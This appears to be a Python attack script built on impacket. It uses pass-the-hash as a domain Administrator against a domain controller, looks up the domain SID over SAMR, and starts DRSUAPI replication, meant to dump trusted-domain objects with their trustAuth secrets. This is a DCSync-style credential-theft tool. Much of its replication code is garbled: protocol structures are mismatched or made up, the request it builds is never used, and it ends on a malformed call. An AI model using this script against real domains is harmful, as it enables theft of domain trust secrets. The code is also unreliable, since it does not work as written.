#!/usr/bin/env python3
# Replicate domain NC via DRSUAPI and dump any trustedDomain TDO (incl. trustAuth secrets).
import sys, binascii, struct
from impacket.dcerpc.v5 import drsuapi, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket import ntlm

TARGET='<DC_IP>'
DOMAIN='legacy.corp'
USER='legacy.corp\\Administrator'
LM=ntlm.LMOWFv1  # placeholder
HASH='<HASH>:<HASH>'
lmhash, nthash = HASH.split(':')

# resolve domain SID + NC via SAMR
from impacket.dcerpc.v5 import samr
rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\samr]' % TARGET)
rpc.set_credentials(USER, '', DOMAIN, lmhash, nthash)
rpc.set_kerberos(False)
dce = rpc.get_dce_rpc(); dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
resp = samr.hSamrConnect(dce, r'\ROOT')
handle = resp['ServerHandle']
resp = samr.hSamrEnumerateDomainsInSamServer(dce, handle)
domains = [d['Name'] for d in resp['Buffer']['Buffer']]
# open domain
for dn in domains:
    if dn.lower() in ('legacy', 'legacy.corp'):
        resp = samr.hSamrLookupDomainInSamServer(dce, handle, dn)
        domain_sid = resp['DomainId'].formatCanonical()
        break
dce.disconnect()
print("[+] domain sid:", domain_sid)

# Now DRSUAPI
rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]' % TARGET)
rpc.set_credentials(USER, '', DOMAIN, lmhash, nthash)
rpc.set_kerberos(False)
dce = rpc.get_dce_rpc(); dce.connect(); dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

# DrsBind
req = drsuapi.DrsBind()
req['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
drs = drsuapi.DRS_EXTENSIONS_INT()
drs['cb'] = len(drsuapi.DRS_EXTENSIONS())
drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
drs['SiteObjGuid'] = drsuapi.NULLGUID
drs['PingFlags'] = 0
drs['Flags'] = 0
drs['CdcAtDc'] = 0
drs['ConfigObjGUID'] = drsuapi.NULLGUID
drs['ExtCaps'] = drsuapi.DRS_EXTENSIONS(-1)
drs['dwReplEpoch'] = 0
drs['cCustomOids'] = 0
drs['rgCustomOids'] = NULL
drs['fSuppServSites'] = 0
drs['fSuppCleanupAncestorsNow'] = 0
req['pextServer'] = drs
resp = dce.request(req, drsuapi.MSRPC_DRSBIND)
print("[+] DrsBind OK")

# Build highwater
highwatermark = drsuapi.DRS_HIGHWATERMARK(); highwatermark['tmp_highest_usn'] = 0
maxobject = drsuapi.DRS_MSG_GETCHGREQ_REPLY_V5()
maxobject['cMaxObjects'] = 0x3FFFFFFF
maxobject['cMaxBytes'] = 0x7FFFFFFF
maxobject['cMaxValuesLen'] = 0x19402
u = drsuapi.DRS_MSG_GETCHGREQ()
u['V5'] = drsuapi.DRS_MSG_GETCHGREQ_REPLY_V5()
u['V5']['uuidDsaObjDest'] = drsuapi.NULLGUID
u['V5']['uuidInvocIdSrc'] = NULL
u['V5']['npmsg'] = None
u['V5']['nExtInfo'] = 0
u['V5']['pmsgDrain'] = 0
u['V5']['fMoreData'] = 0
u['V5']['fDwExt'] = 0
u['V5']['fTombstone'] = 0
u['V5']['fUpToDateVec'] = 0
u['V5']['fReplInfo'] = 0
u['V5']['fDsExtendedOp'] = 0
u['V5']['cMaxNcSize'] = 0
u['V5']['cNumObjects'] = 1
u['V5']['pExtras'] = None
u['V5']['DsName'] = None
u['V5']['DsExtensions'] = NULL
# up-to-date vector
resp = drsuapi.hDRSGetNCChanges(dce, dce, drsuapi.DRS_MSG_GETCHGREQ(), drsuapi.DRS_MSG_GETCHGREPLY())